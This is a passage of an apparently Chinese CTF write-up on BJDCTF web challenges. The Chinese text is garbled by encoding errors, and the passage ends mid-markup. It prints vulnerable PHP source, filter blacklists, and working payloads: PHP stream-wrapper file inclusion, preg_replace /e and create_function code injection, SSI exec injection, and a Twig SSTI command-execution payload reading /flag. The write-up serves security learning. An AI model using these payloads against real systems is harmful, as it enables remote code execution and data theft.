class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»<code>next.php</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;next.php</span><br><span class="line">POST: I have a dream</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>,<span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,$str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»flagï¼Œå…·ä½“å‚è§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h3><p>æ‰«è·¯å¾„å‘ç°<code>index.php.swp</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">$random = $chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].$chars[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">$content = uniqid().$random;</span><br><span class="line"><span class="keyword">return</span> sha1($content); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> $_POST[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        $admin = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( $admin == substr(md5($_POST[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            $file_shtml = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            $shtml = fopen($file_shtml, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            $text = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite($shtml,$text);</span><br><span class="line">            fclose($shtml);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªéœ€è¦æ§åˆ¶<code>password</code>çš„MD5å€¼å‰å…­ä½ä¸º<code>6d0bc1</code>å°±å¯ä»¥æˆåŠŸå†™å…¥ä¸€ä¸ª<code>.shtml</code>æ–‡ä»¶ï¼Œå†…å®¹é‡Œæœ‰<code>username</code>çš„å€¼ï¼Œä½†å‘ç°æ–‡ä»¶åä¸å¯æ§ï¼Œåæ¥åœ¨å“åº”å¤´é‡Œçœ‹åˆ°äº†æ–‡ä»¶è·¯å¾„</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200202124321.png" style="zoom:80%;"><p>usernameå†™ä¸Šä¸€å¥è¯å‘ç°æ²¡èƒ½è§£æï¼Œåæ¥äº†è§£åˆ°å¦‚æœç›®æ ‡ApacheæœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒï¼Œæˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ªshtmlæ–‡ä»¶ï¼Œå¹¶åˆ©ç”¨ä¸‹é¢è¯­æ³•æ‰§è¡Œä»»æ„å‘½ä»¤:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;id&quot; --&gt;</span></span><br></pre></td></tr></table></figure><p>æ€æ ·å¼€å¯å…·ä½“å‚è§ï¼š<a href="https://www.zhangfangzhou.cn/apache-ssi-configuration.html">https://www.zhangfangzhou.cn/apache-ssi-configuration.html</a></p><p>å¯ä»¥æ„é€ å¦‚ä¸‹payload:</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200202125427.png" style="zoom:80%;"><p>æœ€ç»ˆï¼Œåœ¨ç½‘ç«™ç›®å½•å‘ç°flag</p><h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>ç™»é™†ä¹‹åå‘ç°Cookieé‡Œå¤šäº†userï¼ŒåŒæ ·æ˜¯SSTIï¼Œè¿™ä¸ªæ˜¯twigæ¨¡æ¿ï¼Œpayload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200202152050.png" style="zoom:80%;"><h3 id="EzPHP"><a href="#EzPHP" class="headerlink" title="EzPHP"></a>EzPHP</h3><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°<code>GFXEIM3YFZYGQ4A=</code>ï¼Œbase32è§£ç å¾—<code>1nD3x.php</code>ï¼Œè®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">$file = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line">$shana = $_GET[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line">$passwd = $_GET[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">$arg = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$code = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">        $file = $_GET[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜è€ƒçš„çŸ¥è¯†ç‚¹æ¯”è¾ƒå¤šï¼Œåˆ†å¼€è®°ä¸€ä¸‹</p><h4 id="SERVER-â€˜QUERY-STRINGâ€™-åŒ¹é…ç»•è¿‡"><a href="#SERVER-â€˜QUERY-STRINGâ€™-åŒ¹é…ç»•è¿‡" class="headerlink" title="$_SERVER[â€˜QUERY_STRINGâ€™]åŒ¹é…ç»•è¿‡"></a>$_SERVER[â€˜QUERY_STRINGâ€™]åŒ¹é…ç»•è¿‡</h4><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>è¿”å›urlä¸­æŸ¥è¯¢çš„å­—ç¬¦ä¸²ï¼Œä¸æ­¤ç±»ä¼¼çš„è¿˜æœ‰ï¼š</p><ul><li><code>$_SERVER[&#39;REQUEST_URI&#39;]</code>è¿”å›è®¿é—®æ­¤é¡µé¢æ‰€éœ€çš„URI</li><li><code>$_SERVER[&#39;SCRIPT_NAME&#39;]</code>è¿”å›åŒ…å«å½“å‰è„šæœ¬çš„è·¯å¾„</li><li><code>$_SERVER[&#39;PHP_SELF&#39;]</code>å½“å‰æ­£åœ¨æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶å</li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼š(æµè§ˆå™¨è‡ªåŠ¨å°†fileçš„urlç¼–ç è§£ç äº†)</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200210162052.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°ï¼Œ<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>å’Œ<code>$_SERVER[&#39;REQUEST_URI&#39;]</code>åœ¨ä¼ è¾“æ—¶ä¸ä¼šurlè§£ç ï¼Œè€Œ<code>$_GET</code>,<code>$_POST</code>ä¼šurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥urlç¼–ç ç»•è¿‡ä¸‹é¢ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER) &#123; </span><br><span class="line">    <span class="keyword">if</span> (    preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>])</span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å­—ç¬¦ä¸²åŒ¹é…ç»•è¿‡"><a href="#å­—ç¬¦ä¸²åŒ¹é…ç»•è¿‡" class="headerlink" title="å­—ç¬¦ä¸²åŒ¹é…ç»•è¿‡"></a>å­—ç¬¦ä¸²åŒ¹é…ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, $_GET[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; $_GET[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡æœ‰<code>/s</code>ä¿®é¥°ç¬¦ç”¨æ¥åœ¨åŒ¹é…æ—¶åŒ¹é…æ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>%0a</code>æ¢è¡Œæ±¡æŸ“ç»•è¿‡</p><h4 id="REQUESTå­—æ¯åŒ¹é…ç»•è¿‡"><a href="#REQUESTå­—æ¯åŒ¹é…ç»•è¿‡" class="headerlink" title="$_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡"></a>$_REQUESTå­—æ¯åŒ¹é…ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $value) &#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, $value))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹å‰çš„å‚æ•°éƒ½æ˜¯GETå‹çš„ï¼Œè€ŒPOSTçš„ä¼˜å…ˆçº§æ¯”GETçš„è¦é«˜ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥POSTåŒæ ·åç§°æ»¡è¶³æ¡ä»¶çš„å€¼ï¼Œæ¯”å¦‚æ•°å­—,</p><p>æ•°ç»„ç±»å‹çš„æ•°æ®ä¸éœ€è¦POSTï¼Œ<code>preg_match()</code>åªèƒ½åŒ¹é…å­—ç¬¦ä¸²ï¼Œæ•°ç»„å¾—ä»¥ç»•è¿‡</p><h4 id="file-get-contentsæ¯”å¯¹ç»•è¿‡"><a href="#file-get-contentsæ¯”å¯¹ç»•è¿‡" class="headerlink" title="file_get_contentsæ¯”å¯¹ç»•è¿‡"></a>file_get_contentsæ¯”å¯¹ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents($file) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>åˆšå¼€å§‹æƒ³çš„æ˜¯<code>php://input</code>ï¼Œåæ¥å‘ç°è¦POSTæ•°æ®ï¼Œå› æ­¤ä¾¿ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œå¯ä»¥ç”¨<code>data://</code>ï¼Œç¤ºä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h4 id="sha1æ¯”è¾ƒç»•è¿‡"><a href="#sha1æ¯”è¾ƒç»•è¿‡" class="headerlink" title="sha1æ¯”è¾ƒç»•è¿‡"></a>sha1æ¯”è¾ƒç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œæˆ–è€…sha1ç¢°æ’</p><h4 id="extractå˜é‡è¦†ç›–"><a href="#extractå˜é‡è¦†ç›–" class="headerlink" title="extractå˜é‡è¦†ç›–"></a>extractå˜é‡è¦†ç›–</h4><p>å› ä¸º<code>extract()</code>å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ï¼Œé’ˆå¯¹æ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå°†åœ¨å½“å‰ç¬¦å·è¡¨ä¸­åˆ›å»ºå¯¹åº”çš„ä¸€ä¸ªå˜é‡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä¼ æ•°ç»„ï¼Œå³<code>flag[code]</code>å’Œ<code>flag[arg]</code>çš„å½¢å¼</p><h4 id="create-functionä»£ç æ³¨å…¥"><a href="#create-functionä»£ç æ³¨å…¥" class="headerlink" title="create_functionä»£ç æ³¨å…¥"></a>create_functionä»£ç æ³¨å…¥</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, $code) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, $arg) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    $code(<span class="string">&#x27;&#x27;</span>, $arg); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªè¿‡æ»¤æˆ‘ä»¬å¯ä»¥ç”¨<code>create_function()</code>ç»•è¿‡:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$myFunc = create_function(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="string">&#x27;return($a+$b);&#125;eval($_POST[1]);\\&#x27;</span>);</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œæ—¶ç›¸å½“äºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc</span>(<span class="params">$a, $b</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>å…ˆçœ‹ä¸‹æ‰€æœ‰å˜é‡:</p><img src="/2020/01/29/BJDCTF%E5%A4%8D%E7%8E%B0writeup/TIMæˆªå›¾20200210181423.png" style="zoom:80%;"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 